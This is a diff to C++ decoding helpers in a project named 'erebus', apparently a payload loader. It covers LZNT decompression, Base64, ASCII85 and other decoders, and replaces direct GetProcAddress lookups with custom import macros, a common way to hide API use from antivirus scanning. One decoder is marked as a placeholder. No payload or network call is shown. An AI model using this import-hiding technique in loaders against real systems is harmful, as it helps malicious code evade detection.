@@ -3,9 +3,9 @@
 namespace erebus {
 	VOID DecompressionLZNT(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen)
 	{
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
-		typeRtlDecompressBuffer RtlDecompressBuffer = (typeRtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
+		ImportFunction(ntdll, RtlDecompressBuffer, typeRtlDecompressBuffer);
 
 		if (!Input || !*Input || !InputLen || *InputLen == 0)
 		{
@@ -138,7 +138,7 @@ namespace erebus {
 	BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
 		SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
 		SIZE_T DecodedLen = 0;
 		SIZE_T PaddingCount = 0;
 
@@ -170,7 +170,7 @@ namespace erebus {
 	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
 		SIZE_T OutputCapacity = (InputLen / 5) * 4 + 4;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
 		SIZE_T DecodedLen = 0;
 
 		for (SIZE_T i = 0; i < InputLen; i += 5)
@@ -201,7 +201,7 @@ namespace erebus {
 	{
 		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
 		SIZE_T OutputCapacity = InputLen;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
 		SIZE_T DecodedLen = 0;
 
 		for (SIZE_T i = 0; i < InputLen; i++)
@@ -226,7 +226,7 @@ namespace erebus {
 		// WORDS256 encoding uses a 256-word dictionary - each word is replaced with its index
 		// This is a placeholder implementation; adjust based on your specific word dictionary
 		SIZE_T OutputCapacity = InputLen * 2;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		BYTE* DecodedData = (BYTE*)malloc(OutputCapacity);
 		SIZE_T DecodedLen = 0;
 
 		const CHAR* WordDelimiters = " \t\n\r";
@@ -471,7 +471,7 @@ namespace erebus {
 		default:
 		{
 			LOG_INFO("No encoding detected, returning raw input");
-			*Output = new BYTE[InputLen];
+			*Output = (BYTE*)malloc(InputLen);
 			RtlCopyMemory(*Output, Input, InputLen);
 			*OutputLen = InputLen;
 			return TRUE;
